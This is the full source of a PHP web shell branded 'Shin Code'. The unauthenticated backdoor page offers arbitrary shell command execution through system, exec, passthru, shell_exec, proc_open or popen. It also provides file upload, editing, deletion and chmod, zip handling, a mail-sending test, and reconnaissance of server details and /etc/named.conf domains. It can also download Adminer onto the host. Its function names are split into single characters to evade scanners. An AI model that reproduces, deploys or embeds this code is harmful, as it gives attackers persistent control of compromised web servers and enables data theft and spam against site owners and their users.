<?php
@set_time_limit(0);
@error_reporting(0);
@error_log(0);
function createBreadcrumb($currentDir)
{
    $path = str_replace('\\', '/', $currentDir);
    $parts = explode('/', $path);
    $breadcrumb = array();
    
    foreach ($parts as $id => $part) {
        if ($part == '') {
            $breadcrumb[] = "<a href='?dir=/'>/</a>";
            continue;
        }        
        $path = implode('/', array_slice($parts, 0, $id + 1));
        $breadcrumb[] = "<a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($part, ENT_QUOTES, 'UTF-8') . "</a>";
    }
    return implode(DIRECTORY_SEPARATOR, $breadcrumb);
}

$directory = isset($_GET['dir']) ? $_GET['dir'] : ".";
$directory = @realpath($directory);

if (!$directory || !is_dir($directory)) {
    $backUrl = isset($_SERVER['HTTP_REFERER']) ? htmlspecialchars($_SERVER['HTTP_REFERER'], ENT_QUOTES, 'UTF-8') : '#';
    die("<p style='color: red; font-weight: bold;'><center>Invalid directory. </center><a href='$backUrl'>BACK</a></p>");
}

if (isset($_GET['action']) && $_GET['action'] == 'download' && isset($_GET['target'])) {
    $fileToDownload = $directory . DIRECTORY_SEPARATOR . basename($_GET['target']);
    if (file_exists($fileToDownload)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($fileToDownload) . '"');
        header('Content-Length: ' . filesize($fileToDownload));
        readfile($fileToDownload);
        exit;
    } else {
        echo "<p>File not found for download.</p>";
    }
}

if (isset($_GET['id'])) {
    $id = $_GET['id'];
    $currentFile = basename(__FILE__);
    $backUrl = isset($_SERVER['HTTP_REFERER']) ? htmlspecialchars($_SERVER['HTTP_REFERER'], ENT_QUOTES, 'UTF-8') : $currentFile;
    echo "<h1 style='color: red; font-weight: bold; text-align: center;'><a href='$backUrl'> [ BACK  TO DIRECTORY!!! ]</a></h1>";
    if ($id === 'phpinfo') {
        ob_start();
        phpinfo();
        $phpinfo = ob_get_clean();
        echo $phpinfo;
        exit;
    }
}

$file_g_c = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$file_p_c = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$stream_g_c = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$f_opn = "f"."o"."p"."e"."n";
$p_gm = "p"."r"."e"."g"."_"."m"."a"."t"."c"."h";

if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on'){
    $protocol = 'https';
} else{
    $protocol = 'http';
}
$domain = $_SERVER['HTTP_HOST'];
$urlPath = $protocol . '://' . $domain;

$d0mains = @file("/etc/named.conf");
if ($d0mains) {
    $count = 0;
    foreach ($d0mains as $d0main) {
        if (@$p_gm('#zone "(.*)"#', $d0main, $matches)) {
            flush();
            if (strlen(trim($matches[1])) > 2) {
                flush();
                $count++;
            }
        }
    }
    $count2 = $count / 2;
} else {
    $count2 = "??";
}

echo "
<center>
    <h1 style='color: red;'><strong>[ Shin Code ] - <a href='" .$urlPath . "'>" .$_SERVER['HTTP_HOST']. "</a></strong></h1>
</center>
<div style='border: 1px solid #ccc; padding: 10px; background-color: #f9f9f9; box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto; font-size: 10px;'>
    <h4 style='margin: 0; padding: 5px;'>System: <font color='red'>" . @php_uname() . "</font></h4>
    <h4 style='margin: 0; padding: 5px;'>Hostname: <font color='red'>" . @gethostname() . "</font> | Server Software: <font color='red'>" . $_SERVER['SERVER_SOFTWARE'] . "</font></h4>
    <h4 style='margin: 0; padding: 5px;'>User ID: <font color='red'>" . @getmyuid() . "</font> | Group ID: <font color='red'>" . @getmygid() . "</font> | Username: <font color='red'>" . @get_current_user() . "</font></h4>
    <h4 style='margin: 0; padding: 5px;'>Server IP: <font color='red'>" . gethostbyname($_SERVER['HTTP_HOST']) . "</font> | Port: <font color='red'>" . $_SERVER['SERVER_PORT'] . "</font> | Your IP: <font color='red'>" . $_SERVER['REMOTE_ADDR'] . "</font></h4>
    <h4 style='margin: 0; padding: 5px;'>PHP Version: <font color='red'>" . @phpversion() . "</font> | <a href='?id=phpinfo'>[ PHP INFO ]</a> | Safe Mode: <font color='red'>" . (ini_get('safe_mode') ? 'ON' : 'OFF') . "</font> | Domains: <font color='red'>" . $count2 . "</font></h4>
    <h4 style='margin: 0; padding: 5px; white-space: pre-wrap; word-wrap: break-word;'>Disable Functions: <font color='red'>" . @ini_get('disable_functions') . "</font></h4>
</div>

<h2 style='border: 1px solid #ccc; padding: 10px; background-color: #f9f9f9; box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto; font-size: 15px;'>
        DIR~: " . createBreadcrumb($directory) . "</h2>
       
<div style='border: 1px solid #ccc; padding: 10px; background-color: #f9f9f9; box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto; display: flex; gap: 10px;'>
	<div>
		<form method='get' action=''>
			<input type='hidden' name='dir' value=". $directory .">
			<input type='hidden' name='upload' value='upload'>
			<input type='submit' value='[ Upload ]' style='padding: 10px 20px; margin-top: 20px; background-color: grey; color: #FFF; border: none; cursor: pointer;'>
		</form>
    </div> 	
	<div>
		<form method='get' action=''>
			<input type='hidden' name='dir' value=". $directory .">
			<input type='hidden' name='command' value='command'>
			<input type='submit' value='[ Console ]' style='padding: 10px 20px; margin-top: 20px; background-color: grey; color: #FFF; border: none; cursor: pointer;'>
		</form>
    </div>    
	<div>
		<form method='post'>
			<input type='submit' name='Summon' value='[ Adminer ]' style='padding: 10px 20px; margin-top: 20px; background-color: grey; color: #FFF; border: none; cursor: pointer;'>
		</form>
	</div>
	<div>
		<form method='get' action=''>
			<input type='hidden' name='dir' value=". $directory .">
			<input type='hidden' name='mailewa' value='mailewa'>
			<input type='submit' value='[ Mail Test ]' style='padding: 10px 20px; margin-top: 20px; background-color: grey; color: #FFF; border: none; cursor: pointer;'>
		</form>
	</div>
	<div>
		<form method='post'>
			<input type='submit' name='zip_files' value='[ Zip Files ]' style='padding: 10px 20px; margin-top: 20px; background-color: grey; color: #FFF; border: none; cursor: pointer;'>
		</form>
	</div>
	<div>
		<form method='get' action=''>
			<input type='hidden' name='dir' value=". $directory .">
			<input type='hidden' name='zip_file' value='zip_file'>
			<input type='submit' value='[ Unzip Files ]' style='padding: 10px 20px; margin-top: 20px; background-color: grey; color: #FFF; border: none; cursor: pointer;'>
		</form>
	</div>
	<div>
		<form method='get' action=''>
			<input type='hidden' name='dir' value=". $directory .">
			<input type='hidden' name='creat_file' value='creat_file'>
			<input type='submit' value='[ Create file ]' style='padding: 10px 20px; margin-top: 20px; background-color: grey; color: #FFF; border: none; cursor: pointer;'>
		</form>
    </div>
	<div>
		<form method='get' action=''>
			<input type='hidden' name='dir' value=". $directory .">
			<input type='hidden' name='creat_folder' value='creat_folder'>
			<input type='submit' value='[ Create Folder ]' style='padding: 10px 20px; margin-top: 20px; background-color: grey; color: #FFF; border: none; cursor: pointer;'>
		</form>
    </div>
</div>
";


echo "<table style='width: 100%; max-width: 100%; cellpadding='5' cellspacing='1' border='1px' border-collapse='collapse' margin='10px 0' align='center'>
            
<tr><th>Type</th><th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th></tr>";

if (isset($_GET['dir'])) {
    if (isset($_GET['creat_file'])) {
        echo "
        <div style='border: 1px solid #ccc; padding: 10px; background-color: #f9f9f9; box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto;'>
            <h2>Create File :</h2>
            <form method='post'>
            	<input type='text' name='new_file_name' placeholder='Enter file name' required style='padding: 5px; margin-right: 10px;'>
            	<input type='submit' name='create_file' value='Create File' style='padding: 10px 20px; margin-top: 20px; background-color: grey; color: #FFF; border: none; cursor: pointer;'>
            </form>
        </div>";
        if (isset($_POST['create_file'])) {
        	$newFileName = $_POST['new_file_name'];
        	$newFilePath = $directory . DIRECTORY_SEPARATOR . $newFileName;
        	if (file_exists($newFilePath)) {
        	    echo "<p style='color: red; font-weight: bold;'>File already exists.</p>";
        	} else {
        	    if (touch($newFilePath)) {
                   echo "<p style='color: green; font-weight: bold;'>File '$newFileName' created successfully.</p>";
        	    } else {
                   echo "<p style='color: red; font-weight: bold;'>Failed to create file.</p>";
        	    }
        	}
        }
    }
}

if (isset($_GET['dir'])) {
    if (isset($_GET['creat_folder'])) {
    	echo "
        <div style='border: 1px solid #ccc; padding: 10px; background-color: #f9f9f9; box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto;'>
            <h2>Create Folder :</h2>
            <form method='post'>
            	<input type='text' name='new_folder_name' placeholder='Enter folder name' required  style='padding: 5px; margin-right: 10px;'>
            	<input type='submit' name='create_folder' value='Create Folder' style='padding: 10px 20px; margin-top: 20px; background-color: grey; color: #FFF; border: none; cursor: pointer;'>
            </form>
        </div>";
        if (isset($_POST['create_folder'])) {
        	$newFolderName = $_POST['new_folder_name'];
        	$newFolderPath = $directory . DIRECTORY_SEPARATOR . $newFolderName;
        	if (file_exists($newFolderPath)) {
        	   echo "<p style='color: red; font-weight: bold;'>Folder already exists.</p>";
        	} else {
        	   if (mkdir($newFolderPath)) {
                  echo "<p style='color: green; font-weight: bold;'>Folder '$newFolderName' created successfully.</p>";
        	   } else {
                  echo "<p style='color: red; font-weight: bold;'>Failed to create folder.</p>";
               }
        	}          
        }
    }
}

if (isset($_POST['zip_files'])) {
    $zip = new ZipArchive();
    $zipFileName = $directory . '/archive_' . date('Ymd_His') . '.zip';
    if ($zip->open($zipFileName, ZipArchive::CREATE) === TRUE) {
        $filesToZip = scandir($directory);
        foreach ($filesToZip as $file) {
            if ($file != '.' && $file != '..') {
                $filePath = $directory . DIRECTORY_SEPARATOR . $file;
                if (is_file($filePath)) {
                    $zip->addFile($filePath, $file);
                }
            }
        }
        $zip->close();
        echo "<p style='color: green;'>Files successfully zipped to <strong>archive.zip</strong>.</p>";
    } else {
        echo "<p style='color: red;'>Failed to create ZIP archive.</p>";
    }
}

if (isset($_GET['dir'])) {
    if (isset($_GET['zip_file'])) {
        echo "
        <div style='border: 1px solid #ccc; padding: 10px; background-color: #f9f9f9; box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto;'>
            <h2>Unzip Files :</h2>
            <form method='post' enctype='multipart/form-data'>
                <input type='file' name='zip_file' accept='.zip' required>
                <input type='submit' name='unzip_files' value='Unzip File' style='padding: 10px 20px; margin-top: 20px; background-color: grey; color: #FFF; border: none; cursor: pointer;'>
            </form>
        </div>";
        if (isset($_POST['unzip_files']) && isset($_FILES['zip_file'])) {
        	$zipFilePath = $_FILES['zip_file']['tmp_name'];
        	$zip = new ZipArchive();
        	if ($zip->open($zipFilePath) === TRUE) {
        	    $zip->extractTo($directory);
        	    $zip->close();
        	    echo "<p style='color: green;'>ZIP file successfully extracted to the current directory.</p>";
        	} else {
        	    echo "<p style='color: red;'>Failed to extract ZIP file.</p>";
           }
        }
    }
}

if (isset($_GET['dir'])){
	if (isset($_GET['mailewa'])){
		echo "
		<div style='border: 1px solid #ccc; padding: 10px; background-color: #f9f9f9; box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto;'>
			<h2>Mail Test :</h2>
			<form method='post'>
				<label for='email'>Email:</label>
				<input type='email' name='email' id='email' placeholder='Enter email' required style='padding: 5px; margin-right: 10px;'>
				<input type='submit' value='send test' style='padding: 5px 10px; background-color: grey; color: #FFF; border: none; cursor: pointer;'>
			</form>
		</div>";
		if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['email'])) {
			$xx = rand();
			$to = $_POST['email'];
			$subject = "SHIN MAILER TEST - " . $xx;
			$message = "<html><body>";
			$message .= "<h1>Hello, Shin Ganteng</h1>";
			$message .= "<p>From domain: " . $_SERVER['SERVER_NAME'] . "</p>";
			$message .= "<p>This is a test email sent from Shin Mailer.</p>";
			$message .= "</body></html>";

			$headers = "MIME-Version: 1.0" . "\r\n";
			$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
			if (mail($to, $subject, $message, $headers)) {
				echo "<p style='color: green; font-weight: bold;'>Send a report to [" . $_POST['email'] . "] - $xx</p>";
			} else {
				echo "<p style='color: red; font-weight: bold;'>Failed to send the email.</p>";
			}
        }
    }
}

if (isset($_POST['Summon'])) {
    $baseUrl = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
    $fileUrl = $baseUrl;
    $fileName = 'adminer.php';
    $filePath = $directory . '/' . $fileName;

    function fetchContentUsingCurl($url) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $content = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);

        if ($content === false) {
            return array('success' => false, 'error' => $error);
        }
        return array('success' => true, 'content' => $content);
    }

    $fileContent = @$file_g_c($fileUrl);

    if ($fileContent === false) {
        $curlResult = fetchContentUsingCurl($fileUrl);
        if ($curlResult['success']) {
            $fileContent = $curlResult['content'];
        } else {
            echo "<p style='color: red; font-weight: bold;'>Failed to fetch the file using cURL. Error: " . $curlResult['error'] . "</p>";
            exit;
        }
    }

    $saveStatus = @$file_p_c($filePath, $fileContent);
    if ($saveStatus === false) {
        $file = @$f_opn($filePath, 'w');
        if ($file) {
            $writeStatus = @fwrite($file, $fileContent);
            if ($writeStatus !== false) {
                echo "<p style='color: green; font-weight: bold;'>File \"" . $fileName . "\" summoned successfully using fallback method. <a href='" . $filePath . "'>" . $filePath . "</a></p>";
            } else {
                echo "<p style='color: red; font-weight: bold;'>Failed to write the file content using fallback method.</p>";
            }
            @fclose($file);
        } else {
            echo "<p style='color: red; font-weight: bold;'>Failed to open the file for writing.</p>";
        }
    } else {
        echo "<p style='color: green; font-weight: bold;'>File \"" . $fileName . "\" summoned successfully. <a href='" . $filePath . "'>" . $filePath . "</a></p>";
    }
}

if (isset($_GET['dir'])) {
    if (isset($_GET['command'])) {
        echo "
        <div style='border: 1px solid #ccc; padding: 10px; background-color: #f9f9f9; box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto;'>
            <h2>Execute Command :</h2>
            <form method='post'>
                <input type='text' name='cmd' placeholder='Enter command' required>
                <input type='submit' name='execute' value='Execute' style='padding: 10px 20px; margin-top: 20px; background-color: grey; color: #FFF; border: none; cursor: pointer;'>
            </form>
        </div>";
        if (isset($_POST['execute'])) {
        	$command = $_POST['cmd'];
        	if (!empty($command)) {
        	$result_command = '';
        	$status = null;
        	$currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
        	if (!$currentDir || !is_dir($currentDir)) {
        	    echo "<p>Invalid directory. Execution aborted.</p>";
        	    return;
        	}
        	chdir($currentDir);
        	if (function_exists('system')) {
                ob_start();
                $syst = "s"."y"."s"."t"."e"."m";
                $syst($command . " 2>&1", $status);
                $result_command = ob_get_clean();
        	} elseif (function_exists('passthru')) {
                ob_start();
                $pasthr = "p"."a"."s"."s"."t"."h"."r"."u";
                $pasthr($command . " 2>&1", $status);
                $result_command = ob_get_clean();
        	} elseif (function_exists('exec')) {
                $exc = "e"."x"."e"."c";
                $exc($command . " 2>&1", $output, $status);
                $result_command = @implode("\n", $output);
        	} elseif (function_exists('shell_exec')) {
                $sh_exc = "s"."h"."e"."l"."l"."_"."e"."x"."e"."c";
                $result_command = $sh_exc($command . " 2>&1");
        	} elseif (function_exists('proc_open')) {
                $pro_op = "p"."r"."o"."c"."_"."o"."p"."e"."n";
                $handle = $pro_op($command, array(
                   1 => array('pipe', 'w'),
                   2 => array('pipe', 'w')
                   ), $pipes);
                if (is_resource($handle)) {
                   $result_command = $stream_g_c($pipes[1]);
                   fclose($pipes[1]);
                   fclose($pipes[2]);
                   proc_close($handle);
                }
        	} elseif (function_exists('popen')) {
                 $popn = "p"."o"."p"."e"."n";
                 $handle = $popn($command, 'r');
                 if (is_resource($handle)) {
                     while (!feof($handle)) {
                       $result_command .= fread($handle, 8192);
                     }
                     pclose($handle);
                 }
        	}
        	if (!empty($result_command)) {
                echo "<div style='margin-top: 20px;'>
                           <h4>Command executed in directory: " . htmlspecialchars($currentDir, ENT_QUOTES, 'UTF-8') . "</h4>
                           <pre style='white-space: pre-wrap; background-color: #f2f2f2; font-family: monospace; overflow-y: auto; box-sizing: border-box; height: 500px; width: 100%; max-width: 100%; margin-top: 10px;'>$result_command</pre>
                        </div>";
        	} else {
        	    echo "<p style='color: red; font-weight: bold;'>Failed to execute command.</p>";
        	}
        } else {
            echo "<p style='color: red; font-weight: bold;'>Command cannot be empty.</p>";
        }
      }
   }
}

if (isset($_GET['dir'])) {
    if (isset($_GET['upload'])) {
        echo "
        <div style='border: 1px solid #ccc; padding: 10px; background-color: #f9f9f9; box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto;'>
            <h2>Upload File :</h2>
            <form method='post' enctype='multipart/form-data'>
                <input type='file' name='file' required>
                <input type='submit' name='upload' value='Upload' style='padding: 10px 20px; margin-top: 20px; background-color: grey; color: #FFF; border: none; cursor: pointer;'>
            </form>
        </div>";
        if (isset($_POST['upload'])) {
        	if ($_FILES['file']['error'] === UPLOAD_ERR_NO_FILE) {
        	    echo "<p style='color: red; font-weight: bold;'>No files selected.</p>";
        	} else {
        	    $targetFile = $directory . "/" . basename($_FILES['file']['name']);
        	    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
                    echo "<p style='color: green; font-weight: bold;'>File uploaded successfully using move_uploaded_file.</p>";
        	    } else {
                    echo "<p style='color: red; font-weight: bold;'>Failed to upload file using move_uploaded_file. Attempting alternative methods...<br></p>";
        	        if (copy($_FILES['file']['tmp_name'], $targetFile)) {
                        echo "<p style='color: green; font-weight: bold;'>File uploaded successfully using copy.</p>";
        	        } 
                    else if (rename($_FILES['file']['tmp_name'], $targetFile)) {
                        echo "<p style='color: green; font-weight: bold;'>File uploaded successfully using rename.</p>";
                    } 
                    else {
                    	$inputStream = $f_opn($_FILES['file']['tmp_name'], 'rb');
                    	$outputStream = $f_opn($targetFile, 'wb');
                    	if ($inputStream && $outputStream) {
                    	    while (!feof($inputStream)) {
                                fwrite($outputStream, fread($inputStream, 8192));
                    	    }
                    	    fclose($inputStream);
                    	    fclose($outputStream);
                    	    if (file_exists($targetFile)) {
                                echo "<p style='color: green; font-weight: bold;'>File uploaded successfully using stream operations.</p>";
                    	    } else {
                                echo "<p style='color: red; font-weight: bold;'>Failed to upload file using stream operations.</p>";
                    	    }
                    	} else {
                    	    echo "<p style='color: red; font-weight: bold;'>Failed to open file streams.</p>";
                    	}
                    }
                }
        	}
        }
    }
}

if (isset($_POST['edit'])) {
    $fileToEdit = $directory . DIRECTORY_SEPARATOR . basename($_POST['file_name']);
    if (is_file($fileToEdit)) {
        if ($file_p_c($fileToEdit, $_POST['file_content']) !== false) {
            echo "<p style='color: green; font-weight: bold;'>File successfully edited using $file_p_c.</p>";
        } else {
            echo "<p style='color: red; font-weight: bold;'>Failed to save file changes using $file_p_c. Attempting alternative methods...</p><br>";

            $fileHandle = @$f_opn($fileToEdit, 'w');
            if ($fileHandle) {
                if (fwrite($fileHandle, $_POST['file_content']) !== false) {
                    echo "<p style='color: green; font-weight: bold;'>File successfully edited using fwrite.</p>";
                } else {
                    echo "<p style='color: red; font-weight: bold;'>Failed to save file changes using fwrite.</p>";
                }
                fclose($fileHandle);
            } else {
                $tempFile = tempnam(sys_get_temp_dir(), 'edit_');
                if ($tempFile) {
                    if ($file_p_c($tempFile, $_POST['file_content']) !== false) {
                        if (rename($tempFile, $fileToEdit)) {
                            echo "<p style='color: green; font-weight: bold;'>File successfully edited using temporary file and rename.</p>";
                        } else {
                            echo "<p style='color: red; font-weight: bold;'>Failed to rename the temporary file to the target file.</p>";
                        }
                    } else {
                        echo "<p style='color: red; font-weight: bold;'>Failed to write to temporary file.</p>";
                    }
                    if (file_exists($tempFile)) {
                        unlink($tempFile);
                    }
                } else {
                    echo "<p style='color: red; font-weight: bold;'>Failed to create a temporary file.</p>";
                }
            }
            $inputStream = $f_opn('php://memory', 'w+');
            if ($inputStream) {
                fwrite($inputStream, $_POST['file_content']);
                rewind($inputStream);

                $outputStream = @$f_opn($fileToEdit, 'w');
                if ($outputStream) {
                    while (!feof($inputStream)) {
                        if (fwrite($outputStream, fread($inputStream, 8192)) === false) {
                            echo "<p style='color: red; font-weight: bold;'>Failed to save file changes using stream operations.</p>";
                            break;
                        }
                    }
                    fclose($outputStream);
                    echo "<p style='color: green; font-weight: bold;'>File successfully edited using stream operations.</p>";
                } else {
                    echo "<p style='color: red; font-weight: bold;'>Failed to open the target file for writing.</p>";
                }
                fclose($inputStream);
            } else {
                echo "<p style='color: red; font-weight: bold;'>Failed to create in-memory stream.</p>";
            }
        }
    } else {
        echo "<p style='color: red; font-weight: bold;'>File not found.</p>";
    }
}

if (isset($_POST['rename'])) {
    $oldName = $directory . DIRECTORY_SEPARATOR . $_POST['old_name'];
    $newName = $directory . DIRECTORY_SEPARATOR . $_POST['new_name'];

    if (file_exists($oldName)) {
        if (rename($oldName, $newName)) {
            echo "<p style='color: green;'>Successfully renamed to: " . htmlspecialchars($_POST['new_name'], ENT_QUOTES, 'UTF-8') . "</p>";
        } else {
            echo "<p style='color: red;'>Failed to rename using rename(). Trying alternative methods...</p>";

            if (is_file($oldName)) {
                if (copy($oldName, $newName)) {
                    unlink($oldName);
                    echo "<p style='color: green;'>Successfully renamed file using alternative method.</p>";
                } else {
                    echo "<p style='color: red;'>Failed to rename file using alternative method.</p>";
                }
            } elseif (is_dir($oldName)) {
                if (mkdir($newName)) {
                    $files = scandir($oldName);
                    foreach ($files as $file) {
                        if ($file !== '.' && $file !== '..') {
                            rename($oldName . DIRECTORY_SEPARATOR . $file, $newName . DIRECTORY_SEPARATOR . $file);
                        }
                    }
                    rmdir($oldName);
                    echo "<p style='color: green;'>Successfully renamed folder using alternative method.</p>";
                } else {
                    echo "<p style='color: red;'>Failed to rename folder using alternative method.</p>";
                }
            } else {
                echo "<p style='color: red;'>Target is neither a file nor a folder.</p>";
            }
        }
    } else {
        echo "<p style='color: red;'>File or folder not found.</p>";
    }
}

if (isset($_POST['change_permissions'])) {
    $chmodTarget = $_POST['chmod_target'];
    $chmodValue = $_POST['chmod_value'];

    if ($p_gm('/^[0-7]{3,4}$/', $chmodValue)) {
        $isValid = true;
    } else {
        $isValid = ctype_digit($chmodValue) && strlen($chmodValue) >= 3 && strlen($chmodValue) <= 4 && max(str_split($chmodValue)) <= 7;
    }

    if ($isValid) {
    	$chemod = "c"."h"."m"."o"."d";
        if ($chemod($chmodTarget, octdec($chmodValue))) {
            echo "<p style='color: green;'>Permissions for '" . htmlspecialchars($_GET['target'], ENT_QUOTES, 'UTF-8') . "' successfully changed to " . htmlspecialchars($chmodValue, ENT_QUOTES, 'UTF-8') . ".</p>";
        } else {
            echo "<p style='color: red;'>Failed to change permissions for '" . htmlspecialchars($_GET['target'], ENT_QUOTES, 'UTF-8') . "'.</p>";
        }
    } else {
        echo "<p style='color: red;'>Invalid permission value. Please provide a valid value (e.g., 0755).</p>";
    }
}

function deleteDirectory($dir) {
    if (!is_dir($dir)) {
        return false;
    }
    $items = array_diff(scandir($dir), array('.', '..'));
    foreach ($items as $item) {
        $path = $dir . DIRECTORY_SEPARATOR . $item;

        if (is_dir($path)) {
            deleteDirectory($path);
        } else {
            unlink($path);
        }
    }

    return rmdir($dir);
}


if (isset($_GET['action']) && isset($_GET['target'])) {
    $action = $_GET['action'];
    $target = $directory . DIRECTORY_SEPARATOR . basename($_GET['target']);

    if ($action === 'delete') {
        if (is_file($target)) {
            if (unlink($target)) {
                echo "<p style='color: green; font-weight: bold;'>File '" . htmlspecialchars($_GET['target'], ENT_QUOTES, 'UTF-8') . "' successfully deleted.</p>";
            } else {
                echo "<p style='color: red; font-weight: bold;'>Failed to delete file '" . htmlspecialchars($_GET['target'], ENT_QUOTES, 'UTF-8') . "'.</p>";
            }
        } elseif (is_dir($target)) {
            if (deleteDirectory($target)) {
                echo "<p style='color: green; font-weight: bold;'>Folder '" . htmlspecialchars($_GET['target'], ENT_QUOTES, 'UTF-8') . "' successfully deleted.</p>";
            } else {
                echo "<p style='color: red; font-weight: bold;'>Failed to delete folder '" . htmlspecialchars($_GET['target'], ENT_QUOTES, 'UTF-8') . "'.</p>";
            }
        } else {
            echo "<p style='color: red; font-weight: bold;'>Invalid target for deletion.</p>";
        }
    } elseif ($action === 'edit') {
        if (is_file($target)) {
            $content = "<p style='color: red; font-weight: bold;'>File tidak dapat dibaca atau tidak ditemukan.</p>";
            if (is_readable($target)) {
                $content = @$file_g_c($target);
                if ($content === false) {
                    $handle = @$f_opn($target, "r");
                    if ($handle) {
                        $content = '';
                        while (!feof($handle)) {
                            $content .= fread($handle, 8192);
                        }
                        fclose($handle);
                    } else {
                        $lines = @file($target, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                        if ($lines !== false) {
                            $content = implode("\n", $lines);
                        } else {
                            $content = "<p style='color: red; font-weight: bold;'>Gagal membaca file dengan semua metode.</p>";
                        }
                    }
                }
                
                $content = htmlspecialchars($content, ENT_QUOTES, 'UTF-8');
            }
            echo "<h5>Edit File: " . htmlspecialchars($_GET['target'], ENT_QUOTES, 'UTF-8') . "</h5>
                     <form method='post'>
                     	<textarea name='file_content' rows='10' cols='50' style='width: 100%; height: 30%; box-sizing: border-box;'>$content</textarea><br>
                     	<input type='hidden' name='file_name' value='" . htmlspecialchars($_GET['target'], ENT_QUOTES, 'UTF-8') . "'>
                     	<input type='submit' name='edit' value='Save'>
                     </form>";
        } else {
            echo "<p style='color: red; font-weight: bold;'>File not found.</p>";
        }
    } elseif ($action === 'rename') {
        if (is_file($target) || is_dir($target)) {
            echo "<h5>Rename: " . htmlspecialchars($_GET['target'], ENT_QUOTES, 'UTF-8') . "</h5>
                    <form method='post'>
                        <input type='text' name='new_name' style='width: 100%; box-sizing: border-box;' value='" . htmlspecialchars($_GET['target'], ENT_QUOTES, 'UTF-8') . "'><br>
                        <input type='hidden' name='old_name' value='" . htmlspecialchars($_GET['target'], ENT_QUOTES, 'UTF-8') . "'>
                        <input type='submit' name='rename' value='Rename'>
                    </form>";
        }
    } elseif ($action === 'chmod') {
    	if (is_file($target) || is_dir($target)) {
            echo "<h5>Change Permissions: " . htmlspecialchars($_GET['target'], ENT_QUOTES, 'UTF-8') . "</h5>
               <form method='post'>
               	<input type='hidden' name='chmod_target' value='" . htmlspecialchars($target, ENT_QUOTES, 'UTF-8') . "'>
               	<input type='number' name='chmod_value' placeholder='e.g., 0755' required>
               	<button type='submit' name='change_permissions'>Change</button>
               </form>";
        } else {
            echo "<p>Target not found for chmod.</p>";
        }        
    }
}

$folders = array();
$files = array();

if ($dh = @opendir($directory)) {
    while (($file = readdir($dh)) !== false) {
        if ($file == "." || $file == "..") continue;
        $path = $directory . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            $folders[] = $file;
        } else {
            $files[] = $file;
        }
    }
    closedir($dh);
}
else {
    $items = @scandir($directory);
    if ($items !== false) {
        foreach ($items as $file) {
            if ($file == "." || $file == "..") continue;
            $path = $directory . DIRECTORY_SEPARATOR . $file;
            if (is_dir($path)) {
                $folders[] = $file;
            } else {
                $files[] = $file;
            }
        }
    } else {
        $currentDir = @getcwd();
        if ($currentDir === $directory) {
            $items = glob($directory . '/*');
            if ($items) {
                foreach ($items as $path) {
                    $file = basename($path);
                    if (is_dir($path)) {
                        $folders[] = $file;
                    } else {
                        $files[] = $file;
                    }
                }
            }
        } else {
            echo "<tr><td colspan='5' style='color: red; text-align: center'>No items found.</td></tr>";
        }
    }
}

function getPermissions($path) {
    $perms = fileperms($path);

    if (($perms & 0xC000) == 0xC000) {
        $info = 's'; // Socket
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l'; // Symbolic Link
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-'; // Regular
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b'; // Block special
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd'; // Directory
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c'; // Character special
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p'; // FIFO pipe
    } else {
        $info = 'u'; // Unknown
    }

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

